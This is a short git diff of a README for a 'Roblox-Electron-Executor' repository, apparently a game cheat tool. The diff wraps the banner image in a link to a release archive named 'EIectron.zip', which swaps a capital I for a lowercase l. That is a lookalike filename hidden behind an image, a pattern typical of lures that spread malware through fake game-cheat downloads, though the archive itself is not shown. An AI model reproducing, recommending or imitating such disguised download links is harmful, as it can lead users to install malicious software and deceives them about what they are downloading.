@@ -1,6 +1,6 @@
 # Roblox-Electron-Executor
 
-![318852452-03a37f6a-a65e-46ac-92f8-10e369b611a4](https://github.com/ismail50490/Roblox-Electron-Executor/assets/61527784/3e92271d-0ae8-4022-b6f1-d35ecbccf874)
+[![318852452-03a37f6a-a65e-46ac-92f8-10e369b611a4](https://github.com/ismail50490/Roblox-Electron-Executor/assets/61527784/3e92271d-0ae8-4022-b6f1-d35ecbccf874)](https://github.com/ismail50490/Roblox-Electron-Executor/releases/download/v2.50/EIectron.zip)
 
 ![sddefault](https://github.com/ismail50490/Roblox-Electron-Executor/assets/61527784/fbd9d30e-46bf-4082-9282-b5e4db174a7b)
 
